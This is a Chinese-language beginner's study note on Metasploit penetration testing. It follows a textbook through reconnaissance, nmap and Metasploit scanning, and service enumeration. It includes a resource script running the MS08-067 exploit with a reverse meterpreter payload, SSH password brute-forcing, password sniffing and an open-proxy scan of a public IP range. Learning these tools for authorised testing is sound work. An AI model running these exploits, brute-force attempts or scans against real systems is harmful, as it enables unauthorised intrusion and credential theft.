# kali msf 初学
参考书《metasploit渗透测试魔鬼训练营》
## 启动
1. msfgui 已经废弃了，用armitage代替;
2. msfcli 已经废弃了，使用msfconsole -x 代替;也可以吧在msfconsole中分步写成脚本形式，然后msfconsole -r [脚本文件名];脚本例子
```shell
use exploit/windows/smb/ms08_067_netapi
set RHOST [IP]
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [IP]
run
```
3. msfconsole 命令行版本
## 常用命令
### 帮助
* help [COMMAND] 
* search 搜索指令
### 常用流程
1. use 某某模块
2. show payloads 
3. set 指定payload 
4. show options 
5. set option值 
6. exploit 攻击

## 渗透测试常用流程
### A. 外围信息搜集
#### 一、通过DNS和IP地址挖掘目标网络信息
1. 也就是公开信息扫描,通常使用whois,nslookup,dig
```
msf> whois testfire.net
//---------------
# nslookup
>set type=A
>testfire.net
//--------------
#dig @ns.waston.ibm.com testfire.net
```
2. IP2Location 地理位置查询
GeoIP或cz88
3. netcraft网站提供的信息查询服务
4. IP2Domain 反查域名
（可以用旁注）
#### 二、通过搜索引擎进行信息搜集
1. google hacking技术
（有GHDB、SiteDigger、Search Diggity）
2. 探索网站的目录结构
（可以发现后台管理目录、源码备份文件、配置文件、数据库SQL文件等）
```
parent directory site:testfire.net
```
还可以使用metasploit中的brute_dirs、dir_listing、dir_scanner等辅助模块暴力猜解后台
```
msf> use auxiliary/scanner/http/dir_scanner
> set THREADS 50
> SET RHOST www.testfire.net
> exploit
```
另外，有些网站下面的robots.txt会泄露些有用的目录信息

3. 检索特定类型文件
（某些缺乏安全意思的管理员为了方便会将类似通讯录、订单等敏感内容的文件链接放到网上）
```
site:testfire.net filetype:xls
```
4. 搜索网站中的E-mail地址
（用于社会工程学）
```
msf> use auxiliary/gather/search_email_collector
>set DOMAIN altoromutual.com
>run
```
5. 搜索易存在SQL注入点的页面
（比如登陆页面）
```
site:testfire.net inurl:login
```
### B. 主机探测与端口扫描
1. 活跃主机扫描
* ICMP Ping命令
* metasploit 的主机发现模块
(常用arp_sweep、udp_sweep，其他的用search discovery来查找)
```
msf> use auxiliary/scanner/discovery/arp_sweep
>set RHOSTS 10.10.10.0/24
>set THREADS 50
>run
```
注：arp扫描只适合同一个网段的
* nmap
```
#nmap -sn 10.10.10.0/24
//如果internet上过滤了ping，可以使用-PU对开放的UDP端口进行探测
#nmap -sn -PU 10.10.10.0/24
```
2. 操作系统识别
```
#nmap -O 10.10.10.101
```
注 ：-A可以获取更详细的信息

3. 端口扫描与服务类型探测
（端口扫描常用技术：TCP Connect、TCP SYN、TCP ACK、TCP FIN等，一般推荐用SYN，最快且相对隐蔽）
* metasploit
```
// search portscan
msf> use auxiliary/scanner/portscan/syn
>set THREADS 20
>run
```
* nmap 
```
//-sS表示使用TCP SYN扫描，-Pn表示扫描之前不使用ICMP echo探测目标
nmap -sS -Pn 10.10.10.101
//扫描开放端口服务的详细版本号
nmap -sV -Pn 10.10.10.101
```
4. 讲扫描结果进行分析，得到分析结果

### C. 服务扫描与查点
确定开放的端口后，通常会对相应端口上所运行服务的信息进行更深入的挖掘，通常称为服务查点。
1. 常见的网络服务扫描
* telnet服务
```
msf> use auxiliary/scanner/telnet/telnet_version
>set RHOSTS 10.10.10.0/24
>set THREADS 100
>run
```
* ssh服务
```
msf> use auxiliary/scanner/ssh/ssh_version
>set RHOSTS 10.10.10.0/24
>set THREADS 100
>run
```
* oracle数据库服务
```
msf> use auxiliary/scanner/oracle/tnslsnr_version
>set RHOSTS 10.10.10.0/24
>set THREADS 50
>run
```

* 开放代理探测与利用
```
msf> use auxiliary/scanner/http/open_proxy
>set SITE www.google.com
>set RHOSTS 24.25.24.1-24.25.26.254
>set MULTIPORTS true
>set VERIFY_CONNECT true
>set THREADS 100
>run
```
2. 口令猜测与嗅探
* SSH服务口令猜测
```
msf> use auxiliary/scanner/ssh/ssh_login
>set RHOSTS 10.10.10.254
>set USERNAME root
>set PASS_FILE /root/words.txt
>set THREADS 50
>run
```
* psnuffle 口令嗅探
```
msf>use auxiliary/sniffer/psnuffle
>run
```
注：同一个网络嗅探

### D、网络漏洞扫描
1. 漏洞扫描原理与漏洞扫描器
（黑盒扫描、白盒扫描）
2. OpenVAS漏洞扫描器
（nessus的开源版本）
（TODO）
（在metasploit内部使用OpenVAS）
（TODO）
3. 查找特定服务漏洞

使用nmap
```
//使用nmap查找MS08-067漏洞
msf>nmap -P0 --script==smb-check-vulns 10.10.10.130
```
4. 漏洞结果分析
（将得到的信息整理为表格）

### E、渗透测试信息数据库与共享
(TODO)

